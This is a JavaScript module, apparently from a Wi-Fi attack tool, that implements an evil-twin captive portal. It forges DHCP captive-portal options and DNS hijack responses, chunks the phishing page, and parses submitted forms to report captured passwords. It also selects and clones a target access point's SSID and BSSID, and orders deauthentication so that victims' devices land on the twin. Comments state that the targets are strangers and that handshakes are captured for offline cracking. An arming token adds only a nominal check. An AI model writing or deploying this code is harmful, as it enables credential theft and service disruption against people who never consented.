// portal.js — the captive portal's wire formats, its page intake, and its arming gate.
//
// Rule 16 applies with no exception: NRSuite's src/portal.cpp is a GPL-3.0
// reference implementation. Read it to know WHICH pieces a portal has
// (softAP + DNS hijack + DHCP captive-portal URI + chunked HTML upload +
// deauth underneath). Write ours from the clause. The clauses here are:
//
//   RFC 8910 §2.1  the Captive-Portal DHCPv4 option (code 114)
//   RFC 2132       the DHCP/BOOTP vendor option format (RFC 2131 §2 wire layout)
//   RFC 1035 §4    DNS message format, and §4.1.4 the compression pointer
//   RFC 8908       the Captive Portal API the option URI must name
//
// Everything in this file is a pure function of its arguments: no DOM, no
// fetch, no timers, no globals. That is deliberate — it is what lets
// tools/verify_portal.mjs import this file directly and put **tshark** on the
// other end of it. Rule 24: judge what you transmit with an independent
// decoder, never with your own return code.
//
// SCOPE NOTE — the portal cannot be gated by SCOPE_ALLOWLIST. That gate works
// for deauth/Karma/Mana because the target is named in advance. A portal's
// victims are strangers by definition, so "answers nothing unless listed"
// cannot port over. The portal gets its own explicit arming gate instead
// (portalArm, at the bottom of this file), and the gate's failure mode is
// still "it did nothing".

export const DHCP_MAGIC_COOKIE = 0x63825363;
export const DHCP_END = 255;

// RFC 8910 §2.1 — "The Captive-Portal DHCPv4 Option (114)".
export const CAPTIVE_PORTAL_OPTION = 114;

// RFC 8910 §1 and Appendix B — code 160 is what RFC 7710 specified, and IANA
// DEPRECATED it: "some Polycom devices on the same network made use of DHCPv4
// option code 160 for other purposes ... The presence of DHCPv4 Option code
// 160 holding a value indicating the Captive Portal API URL caused these
// devices to not function as desired."
//
// So 160 is not "the older spelling of the same thing" — it is a code point
// that is actively harmful to a class of VoIP handsets. It is supported here
// only when a caller asks for it by name, and the default is 114.
export const DEPRECATED_CAPTIVE_PORTAL_OPTION = 160;

// RFC 8910 §2 — "Networks with no captive portals may explicitly indicate this
// condition by using this option with the IANA-assigned URI for this purpose."
export const CAPPORT_UNRESTRICTED = 'urn:ietf:params:capport:unrestricted';

// RFC 2132 §3 / §9 — the handful of options a portal's DHCP offer needs.
export const OPT = {
  SUBNET_MASK: 1,
  ROUTER: 3,
  DNS: 6,
  LEASE_TIME: 51,
  SERVER_ID: 54,
  CAPTIVE_PORTAL: 114,
};

const enc = new TextEncoder();

/** A byte length that must fit in one octet, or it is a protocol violation. */
function assertOneOctetLength(bytes, what) {
  if (bytes.length > 255) {
    // RFC 8910 §2: "As the maximum length of the URI that can be carried in
    // IPv4 DHCP is 255 bytes". Reject rather than truncate — a truncated URI
    // is a silently wrong answer, which is worse than a refused build.
    throw new Error(`${what} is ${bytes.length} bytes; DHCP carries at most 255`);
  }
  if (bytes.length === 0) throw new Error(`${what} must not be empty`);
}

export function ipToBytes(ip) {
  const parts = String(ip).trim().split('.');
  if (parts.length !== 4) throw new Error(`not a dotted-quad IPv4: ${ip}`);
  return parts.map((p) => {
    if (!/^\d{1,3}$/.test(p)) throw new Error(`not a dotted-quad IPv4: ${ip}`);
    const n = Number(p);
    if (n > 255) throw new Error(`octet out of range in ${ip}`);
    return n;
  });
}

// ── RFC 2132: the vendor-option format ──────────────────────────────────────

/** One DHCP option in RFC 2132 §2 wire form: code | len | value. */
export function dhcpOption(code, value) {
  const bytes = value instanceof Uint8Array ? value : Uint8Array.from(value);
  assertOneOctetLength(bytes, `DHCP option ${code}`);
  return Uint8Array.from([code, bytes.length, ...bytes]);
}

/**
 * RFC 8910 §2.1 — the Captive-Portal option.
 *
 *     Code(1) | Len(1) | URI (variable, NOT null-terminated)
 *
 * Two things the RFC is explicit about and a hand-rolled encoder gets wrong:
 *   - the URI is NOT null terminated (RFC 8910 §2.1, final line);
 *   - `Len` counts the URI octets, not including the code or the length.
 *
 * RFC 8910 §2 also says the URI "MUST be that of the captive portal API
 * endpoint" ([RFC8908]) and "SHOULD NOT contain an IP address literal" — with
 * an explicit exception this project falls inside: a lab portal where "DNS is
 * either not available or not fully functional until the captive portal has
 * been satisfied". So an IP-literal URI is allowed, but it has to be asked for
 * knowingly rather than defaulted into.
 */
export function buildCaptivePortalOption(uri, { option = CAPTIVE_PORTAL_OPTION, allowIpLiteral = false } = {}) {
  const text = String(uri ?? '');
  if (!text) throw new Error('captive portal URI must not be empty');
  if (/\0/.test(text)) throw new Error('captive portal URI must not contain a NUL');

  const isBareIpLiteral = /^(https?|urn):\/\/\d{1,3}(\.\d{1,3}){3}([:/]|$)/.test(text);
  if (isBareIpLiteral && !allowIpLiteral) {
    throw new Error(
      'RFC 8910 says the URI SHOULD NOT be an IP literal; pass { allowIpLiteral: true } ' +
      'if this is a lab portal where DNS cannot resolve before the portal is satisfied',
    );
  }
  if (option === DEPRECATED_CAPTIVE_PORTAL_OPTION) {
    // Allowed, but never silent. See the Appendix B note above.
    console.warn?.('portal: emitting deprecated DHCP option 160 (RFC 7710); 114 is the current code point');
  }
  return dhcpOption(option, enc.encode(text));
}

/**
 * The vendor area of a BOOTP/DHCP packet: magic cookie, then options, then the
 * END marker (RFC 2131 §2). This is what goes at byte 236 of the BOOTP message.
 */
export function buildVendorOptions({
  serverId,
  subnetMask = '255.255.255.0',
  router,
  dns = [],
  leaseTime = 3600,
  captivePortalUri,
  captivePortalOption = CAPTIVE_PORTAL_OPTION,
  allowIpLiteral = false,
  extra = [],
} = {}) {
  if (!serverId) throw new Error('serverId (DHCP option 54) is required');
  const out = [0x63, 0x82, 0x53, 0x63]; // magic cookie, big-endian 0x63825363

  out.push(...dhcpOption(OPT.SUBNET_MASK, ipToBytes(subnetMask)));
  out.push(...dhcpOption(OPT.SERVER_ID, ipToBytes(serverId)));
  if (router) out.push(...dhcpOption(OPT.ROUTER, ipToBytes(router)));
  for (const d of (Array.isArray(dns) ? dns : [dns]).filter(Boolean)) {
    out.push(...dhcpOption(OPT.DNS, ipToBytes(d)));
  }
  // Option 51 is a 32-bit seconds count.
  const lease = Number(leaseTime) >>> 0;
  out.push(...dhcpOption(OPT.LEASE_TIME, [(lease >>> 24) & 0xff, (lease >>> 16) & 0xff, (lease >>> 8) & 0xff, lease & 0xff]));

  if (captivePortalUri) {
    out.push(...buildCaptivePortalOption(captivePortalUri, { option: captivePortalOption, allowIpLiteral }));
  }
  for (const o of extra) out.push(...o);

  out.push(DHCP_END);
  return Uint8Array.from(out);
}

// ── RFC 1035 §4: DNS ────────────────────────────────────────────────────────

/** RFC 1035 §3.1 — a domain name as length-prefixed labels ending in a zero octet. */
export function encodeDnsName(name) {
  const clean = String(name).replace(/\.$/, '');
  if (!clean) return Uint8Array.from([0]);
  const out = [];
  for (const label of clean.split('.')) {
    const b = enc.encode(label);
    if (b.length === 0) throw new Error(`empty DNS label in ${name}`);
    if (b.length > 63) throw new Error(`DNS label over 63 octets in ${name}`);
    out.push(b.length, ...b);
  }
  out.push(0);
  return Uint8Array.from(out);
}

/**
 * Read the question section, and remember the exact bytes of the question so
 * the response can echo it verbatim. RFC 1035 §4.1.2: the question is repeated
 * in the response, unchanged.
 */
export function parseDnsQuestion(msg) {
  const b = msg instanceof Uint8Array ? msg : Uint8Array.from(msg);
  if (b.length < 12) throw new Error('DNS message shorter than the 12-byte header');
  const id = (b[0] << 8) | b[1];
  const flags = (b[2] << 8) | b[3];
  const qdcount = (b[4] << 8) | b[5];
  if (qdcount < 1) throw new Error('DNS query carries no question');

  const labels = [];
  let i = 12;
  for (;;) {
    if (i >= b.length) throw new Error('truncated DNS name');
    const len = b[i];
    if (len === 0) { i += 1; break; }
    if ((len & 0xc0) === 0xc0) throw new Error('compression pointer in a question name is not expected');
    i += 1;
    if (i + len > b.length) throw new Error('truncated DNS label');
    labels.push(new TextDecoder().decode(b.subarray(i, i + len)));
    i += len;
  }
  const qtype = (b[i] << 8) | b[i + 1];
  const qclass = (b[i + 2] << 8) | b[i + 3];
  const questionEnd = i + 4;

  return {
    id, flags, qname: labels.join('.'), qtype, qclass,
    questionBytes: b.subarray(12, questionEnd),
  };
}

export const DNS_TYPE = { A: 1, NS: 2, CNAME: 5, AAAA: 28, ANY: 255 };
export const DNS_CLASS_IN = 1;

/**
 * The hijack answer: one A record per name, pointing at us, with the original
 * question echoed. This is what makes every name a client resolves land on the
 * portal instead of on the real site.
 *
 * Two honesty rules this encodes:
 *
 *  1. **An AAAA query must not get an A record.** RFC 1035 defines the RR by
 *     type; answering a AAAA question with an A record is malformed, and a
 *     client that is paying attention discards the whole message. So a non-A
 *     query gets NOERROR with ancount 0 — the client then falls back to A,
 *     which we do answer. `answered` reports which of those happened, so a
 *     caller cannot mistake "we returned a packet" for "we answered the name".
 *
 *  2. **RD is echoed, RA is set.** RFC 1035 §4.1.1: the recursion-desired bit
 *     is copied from the query; RA tells the client recursion is available.
 *     Clearing RD by accident makes well-behaved resolvers retry elsewhere.
 */
export function buildDnsHijackResponse(query, ip, { ttl = 60, authoritative = true } = {}) {
  const q = parseDnsQuestion(query);
  const answerable = q.qtype === DNS_TYPE.A || q.qtype === DNS_TYPE.ANY;

  const opcode = (q.flags >> 11) & 0x0f;      // §4.1.1, echoed
  const rd = (q.flags & 0x0100) !== 0;        // §4.1.1, copied from the query
  let flags = 0x8000;                          // QR = 1, a response
  flags |= (opcode & 0x0f) << 11;
  if (authoritative && answerable) flags |= 0x0400; // AA
  if (rd) flags |= 0x0100;                     // RD echoed
  flags |= 0x0080;                             // RA — we do recursion (into our page)
  // RCODE stays 0 (NOERROR) in both cases, including the un-answered one.

  const qb = q.questionBytes;
  const name = q.qname;
  const extra = answerable ? 16 : 0; // 2+2+2+4+2+4
  const out = new Uint8Array(12 + qb.length + extra);

  out[0] = (q.id >> 8) & 0xff; out[1] = q.id & 0xff;
  out[2] = (flags >> 8) & 0xff; out[3] = flags & 0xff;
  out[4] = 0; out[5] = 1;                      // QDCOUNT = 1
  out[6] = 0; out[7] = answerable ? 1 : 0;     // ANCOUNT
  out[8] = 0; out[9] = 0;                      // NSCOUNT
  out[10] = 0; out[11] = 0;                    // ARCOUNT

  out.set(qb, 12);
  let o = 12 + qb.length;

  if (answerable) {
    // RFC 1035 §4.1.4 — a compression pointer to the question name at offset 12.
    // Legal here and conventional: the name is at a fixed, known offset.
    out[o++] = 0xc0; out[o++] = 0x0c;
    out[o++] = 0; out[o++] = DNS_TYPE.A;
    out[o++] = 0; out[o++] = DNS_CLASS_IN;
    const t = Number(ttl) >>> 0;
    out[o++] = (t >>> 24) & 0xff; out[o++] = (t >>> 16) & 0xff; out[o++] = (t >>> 8) & 0xff; out[o++] = t & 0xff;
    out[o++] = 0; out[o++] = 4;                // RDLENGTH
    out.set(ipToBytes(ip), o);
  }

  return { message: out, answered: answerable, qname: name, qtype: q.qtype, id: q.id };
}

// ── the page: chunked upload, and the intake that must not over-claim ───────

/**
 * Split the portal page into chunks small enough for the serial link.
 *
 * The trap is UTF-8, not size: a JS string is UTF-16 code units, so slicing by
 * `.slice()` can cut a surrogate pair in half, and slicing encoded bytes can cut
 * a multi-byte sequence. A page whose copyright symbol becomes a mojibake byte
 * is a page that renders as garbage on the victim's phone. So: encode first,
 * then only ever end a chunk on a byte that is NOT a continuation byte
 * (0b10xxxxxx), which is always a legal sequence boundary.
 */
export function portalPageChunks(html, chunkSize = 512) {
  const size = Math.max(64, Number(chunkSize) | 0);
  const bytes = enc.encode(String(html ?? ''));
  const chunks = [];
  let start = 0;
  while (start < bytes.length) {
    let end = Math.min(start + size, bytes.length);
    if (end < bytes.length) {
      // Walk back off any continuation bytes: those belong to the sequence that
      // started before `end`, so ending there would split it.
      let guard = 0;
      while (end > start && (bytes[end] & 0xc0) === 0x80 && guard++ < 4) end -= 1;
      if (end === start) end = Math.min(start + size, bytes.length); // pathological: never stall
    }
    chunks.push(bytes.subarray(start, end));
    start = end;
  }
  return chunks;
}

/** Reassemble — the verifier uses this to prove the chunking is lossless. */
export function joinPortalChunks(chunks) {
  const total = chunks.reduce((n, c) => n + c.length, 0);
  const out = new Uint8Array(total);
  let o = 0;
  for (const c of chunks) { out.set(c, o); o += c.length; }
  return out;
}

/**
 * Parse an application/x-www-form-urlencoded submission.
 *
 * The contract that matters: this must not report credentials it does not have.
 * An empty body, a body with no password-shaped field, or a body that is not a
 * form at all must all come back with `ok: false` and a reason — never with
 * `ok: true` and empty fields. An attack that cannot run must never report
 * having run; the same applies to a capture that captured nothing.
 */
export function parsePortalSubmission(body, { passwordFields = ['password', 'pass', 'pwd', 'passwd', 'passphrase'] } = {}) {
  const text = String(body ?? '');
  if (!text.trim()) return { ok: false, reason: 'empty body', fields: {}, warnings: ['empty body'] };

  const fields = {};
  for (const pair of text.split('&')) {
    if (!pair) continue;
    const eq = pair.indexOf('=');
    const k = decodeURIComponent((eq === -1 ? pair : pair.slice(0, eq)).replace(/\+/g, ' '));
    const v = eq === -1 ? '' : decodeURIComponent(pair.slice(eq + 1).replace(/\+/g, ' '));
    if (!k) continue;
    // Keep the first occurrence; note the collision rather than silently losing it.
    if (k in fields) fields[k] = `${fields[k]}\u0000${v}`;
    else fields[k] = v;
  }

  const keys = Object.keys(fields);
  if (keys.length === 0) return { ok: false, reason: 'no form fields', fields, warnings: ['no form fields'] };

  const lowered = lowerKeys(fields);
  // Presence and non-emptiness are DIFFERENT questions, and collapsing them
  // attaches the wrong reason to a correct verdict: a form that submits
  // `password=` submitted a blank password, which is not the same failure as a
  // form with no password field at all. Find the key by presence.
  const pwKey = passwordFields.find((f) => f in lowered);
  const userKey = ['username', 'user', 'email', 'login', 'uname', 'userid']
    .find((f) => f in lowered && lowered[f] !== '');

  const warnings = [];
  const password = pwKey ? lowered[pwKey] : '';
  if (!pwKey) warnings.push('no password field at all');
  else if (password.length === 0) warnings.push('password field is present but blank');

  // A blank password is a real thing a victim submits, so it is only a warning —
  // but it must never be reported as a captured credential.
  const ok = Boolean(pwKey) && password.length > 0;

  return {
    ok,
    reason: ok ? 'credentials captured' : (pwKey ? 'password field present but blank' : 'no password field with a value'),
    username: userKey ? lowered[userKey] : '',
    password,
    fields,
    warnings,
  };
}

function lowerKeys(obj) {
  const out = {};
  for (const [k, v] of Object.entries(obj)) if (!(k.toLowerCase() in out)) out[k.toLowerCase()] = v;
  return out;
}

// ── the arming gate ─────────────────────────────────────────────────────────

export const PORTAL_DISARMED = 'disarmed';

/**
 * The portal's own arming gate — a deliberate replacement for SCOPE_ALLOWLIST,
 * not a relaxation of it.
 *
 * Why it cannot reuse the allowlist: a portal exists to answer devices whose
 * owners were never named. There is nothing to allow-list. But the reason the
 * allowlist existed still applies, and applies harder — a rogue AP is something
 * a **stranger's** device can join and type a password into, so the arming step
 * has to be the careful part instead of the matching.
 *
 * Four properties, mirroring the way SCOPE_LAB_ANY is held:
 *   - the default state is disarmed, so *not thinking about it* means silence;
 *   - arming needs an exact acknowledging token, so it cannot happen on a typo
 *     or a truthy value (`true`, `1`, `'yes'`, `'on'`, `'ARM'` all fail);
 *   - every directive carries which mode produced it, so an armed portal cannot
 *     pass itself off as an ordinary scoped action;
 *   - it refuses an empty SSID — cloning nothing is not a twin of anything.
 */
export const PORTAL_ARM_TOKEN = 'I-own-this-frequency';

export function portalArm({
  acknowledge,
  ssid,
  channel,
  bssid,
  captivePortalUri,
} = {}) {
  const problems = [];
  if (acknowledge !== PORTAL_ARM_TOKEN) {
    problems.push(
      'not armed: acknowledge must be exactly PORTAL_ARM_TOKEN ' +
      "(the near-misses 'true', '1', 'yes', 'on', 'ARM' and 'i-own-this-frequency' are all refused)",
    );
  }
  const cleanSsid = String(ssid ?? '');
  if (!cleanSsid.trim()) problems.push('ssid must not be empty — a twin of nothing lures nobody');
  if (cleanSsid.length > 32) problems.push('ssid over 32 octets (802.11 §9.4.2.2)');

  const ch = Number(channel);
  if (!Number.isInteger(ch) || ch < 1 || ch > 14) {
    problems.push('channel must be an integer 1..14 (the S3 is 2.4 GHz only)');
  }
  if (bssid !== undefined && bssid !== null && bssid !== '' && !/^([0-9a-f]{2}:){5}[0-9a-f]{2}$/i.test(String(bssid))) {
    problems.push('bssid must be xx:xx:xx:xx:xx:xx');
  }
  if (bssid && String(bssid).slice(0, 2).toLowerCase() === '01') {
    problems.push('bssid must be unicast (the I/G bit is set)');
  }
  if (captivePortalUri !== undefined && String(captivePortalUri).trim() === '') {
    problems.push('captivePortalUri must not be a blank string — omit it instead');
  }

  if (problems.length) return { armed: false, mode: PORTAL_DISARMED, problems };

  return {
    armed: true,
    mode: 'portal',
    ssid: cleanSsid,
    channel: ch,
    bssid: bssid ? String(bssid).toLowerCase() : null,
    /** Stamped on every directive so an armed action cannot look scoped. */
    attribution: 'portal/armed',
    captivePortalUri: captivePortalUri ?? `http://192.168.4.1/`,
    // Reminder to the caller, not decoration: this is the arm that a stranger's
    // device can join.
    warning: 'portal is armed: a stranger\'s device can join this AP and submit credentials to it',
  };
}

// ── seeding the twin from what is in the air ────────────────────────────────
//
// Brad's call: the twin is seeded from a scan rather than typed in by hand. The
// scan is /scan's `aps[]`: { ssid, bssid, rssi, ch, auth }, where `auth` is the
// Arduino WiFi.encryptionType enum (firmware/src/main.cpp).
//
// The discipline that matters: **this ranks, a human picks.** Auto-selecting the
// strongest AP would clone whichever neighbour happens to be loudest — the exact
// "attack something you did not mean to" failure the scope rules exist to stop.
// So `rankTwinCandidates` is what a UI shows, and `selectTwinTarget` refuses
// rather than substituting something else when the named AP is not there.

/** Arduino WiFi.encryptionType values (wifi_auth_mode_t), named. */
export const WIFI_AUTH = {
  0: 'open', 1: 'wep', 2: 'wpa_psk', 3: 'wpa2_psk', 4: 'wpa_wpa2_psk',
  5: 'wpa2_enterprise', 6: 'wpa3_psk', 7: 'wpa2_wpa3_psk', 8: 'wapi_psk', 9: 'owe',
};
/** The modes where a captured 4-way handshake is a PSK we can attack offline. */
const CLONEABLE_AUTH = new Set([2, 3, 4]);
/** Modes we must not pretend to clone into a PSK capture. */
const WHY_NOT = {
  0: 'open network — a twin of it captures no PSK, there is nothing to crack',
  1: 'WEP — trivially crackable, but not with the PSK crack loop; the portal is the wrong tool',
  5: 'WPA2-Enterprise — the credential is 802.1X, not a PSK; a twin captures an identity, not a passphrase',
  6: 'WPA3-SAE only — SAE does not hand over a crackable PSK handshake, and PMF makes the knock-off half unreliable',
  7: 'WPA2/WPA3 mixed — the client may negotiate SAE; treat as WPA3-only and expect PMF trouble',
  8: 'WAPI — not the tool for this',
  9: 'OWE (enhanced open) — no PSK at all',
};

/** Why this AP cannot be cloned into a crackable twin, or null if it can. */
export function twinRejectReason(ap) {
  if (!ap) return 'no such AP';
  const auth = Number(ap.auth);
  if (Number.isInteger(auth) && WHY_NOT[auth]) return WHY_NOT[auth];
  const ch = Number(ap.ch);
  if (!Number.isInteger(ch) || ch < 1 || ch > 14) {
    return `channel ${ap.ch} is out of the S3's 2.4 GHz range (1..14) — a twin must sit on the target's own channel, one radio`;
  }
  const bssid = String(ap.bssid || '');
  if (!/^([0-9a-f]{2}:){5}[0-9a-f]{2}$/i.test(bssid)) return `bssid ${JSON.stringify(ap.bssid)} is not a MAC`;
  if (bssid.slice(0, 2).toLowerCase() === '01') return 'bssid is a group address (I/G bit set)';
  if (!String(ap.ssid ?? '').length) return 'hidden SSID — nothing to match a client profile against';
  if (!CLONEABLE_AUTH.has(auth)) return `authentication ${WIFI_AUTH[auth] ?? ap.auth} is not a WPA-PSK mode`;
  return null;
}

/**
 * The candidate list a person chooses from. Ranked by signal, because a scan
 * cannot see clients — so RSSI is a *proxy* for "this one is worth the effort",
 * not evidence that anyone is home. Said out loud rather than implied.
 */
export function rankTwinCandidates(aps, { onlyCloneable = false } = {}) {
  const list = (Array.isArray(aps) ? aps : []).map((ap) => {
    const why = twinRejectReason(ap);
    return {
      ssid: String(ap.ssid ?? ''),
      bssid: String(ap.bssid ?? '').toLowerCase(),
      channel: Number(ap.ch),
      rssi: ap.rssi === undefined || ap.rssi === null ? null : Number(ap.rssi),
      auth: WIFI_AUTH[Number(ap.auth)] ?? String(ap.auth),
      cloneable: why === null,
      why,
    };
  });
  const kept = onlyCloneable ? list.filter((c) => c.cloneable) : list;
  // Strongest first; unknown RSSI last rather than treated as 0 dBm.
  return kept.sort((a, b) => (b.rssi ?? -999) - (a.rssi ?? -999));
}

/**
 * Derive the twin's parameters from a *named* AP in a scan.
 *
 * Refuses if the named AP is not in the scan, and refuses if it is not
 * cloneable — it never quietly substitutes a different AP, because "the twin
 * came up wearing the wrong SSID" is an attack against somebody who was not
 * chosen. The twin's channel is forced to the target's: one radio, so the AP and
 * the capture cannot sit on different channels.
 */
export function selectTwinTarget(aps, { ssid, bssid } = {}) {
  if (!ssid && !bssid) {
    return { ok: false, reason: 'name the target: pass { ssid } or { bssid }. This ranks candidates; it does not pick one.' };
  }
  const all = Array.isArray(aps) ? aps : [];
  const matches = all.filter((ap) => (
    (ssid ? String(ap.ssid ?? '') === String(ssid) : true) &&
    (bssid ? String(ap.bssid ?? '').toLowerCase() === String(bssid).toLowerCase() : true)
  ));

  if (matches.length === 0) {
    return { ok: false, reason: `no AP in the scan matches ${ssid ? `ssid ${JSON.stringify(ssid)}` : `bssid ${bssid}`}` };
  }
  if (matches.length > 1 && !bssid) {
    // One SSID, several BSSIDs (a mesh, or a repeater). Picking one for you would
    // be picking one for you.
    return {
      ok: false,
      reason: `${matches.length} APs share that SSID — give a bssid`,
      candidates: rankTwinCandidates(matches),
    };
  }

  const target = matches[0];
  const why = twinRejectReason(target);
  if (why) return { ok: false, reason: why, candidate: rankTwinCandidates([target])[0] };

  return {
    ok: true,
    twin: {
      ssid: String(target.ssid),
      // Clone the BSSID: after the deauth the client rescans for a profile it
      // already knows, and a matching BSSID resolves to us.
      bssid: String(target.bssid).toLowerCase(),
      channel: Number(target.ch),
      rssi: target.rssi ?? null,
      auth: WIFI_AUTH[Number(target.auth)] ?? String(target.auth),
    },
    // Stated, not implied: RSSI says the AP is audible to us, nothing about whether anyone is on it.
    note: 'a scan shows the AP, never its clients — RSSI is a proxy for "worth a look", not evidence of a victim',
  };
}

// ── the sequencing: portal up FIRST, deauth second ─────────────────────────
//
// Brad's call, and the reason is not quietness — it is a race. A client that has
// just been knocked off rescans for a network it knows. Deauth-first means that
// rescan happens while our twin is still coming up, so the client finds the REAL
// AP again and re-joins it: the deauth is spent and the twin never gets a look.
// Twin-up-first means the matching SSID is already beaconing when the client
// looks. So the ordering is enforced here as a rule, not left to the caller:
//
//     **a deauth is never emitted before the twin has been seen beaconing.**
//
// Note the split with the scope gate, because it is deliberate: the deauth half
// still goes through SCOPE_ALLOWLIST (its target is a named AP/client), while the
// portal half uses portalArm() (its callers are strangers). One feature, two
// gates, each matching what it can actually name.

export function nextPortalAction(state = {}) {
  const {
    twinUp = false,
    twinBeaconConfirmed = false,
    deauthTargets = [],
    deauthRounds = 0,
    maxDeauthRounds = 5,
    clientsLanded = 0,
    credentialsCaptured = 0,
  } = state;

  if (!twinUp) {
    return { action: 'bring_up_twin', allowed: true, reason: 'the twin goes up first' };
  }
  if (!twinBeaconConfirmed) {
    return {
      action: 'wait_for_beacon',
      allowed: true,
      reason: 'the twin must be seen beaconing before anything is knocked off the real AP — ' +
        'otherwise the client rescans and finds the real one',
    };
  }
  if (deauthTargets.length === 0) {
    return { action: 'scan_for_clients', allowed: true, reason: 'twin is up and confirmed; nothing to knock off yet' };
  }
  if (deauthRounds < maxDeauthRounds && clientsLanded === 0) {
    return {
      action: 'deauth',
      allowed: true,
      targets: deauthTargets,
      round: deauthRounds + 1,
      reason: 'twin is confirmed beaconing, so the knock-off has somewhere to land',
    };
  }
  if (clientsLanded > 0) {
    return {
      action: 'serve_portal',
      allowed: true,
      clientsLanded,
      credentialsCaptured,
      reason: 'a client has landed on the twin — the page does the rest, and the 4-way handshake is captured natively (we are the AP)',
    };
  }
  return {
    action: 'stop',
    allowed: false,
    reason: `gave up after ${deauthRounds} deauth round(s) with no client landing — stop rather than hammer`,
  };
}

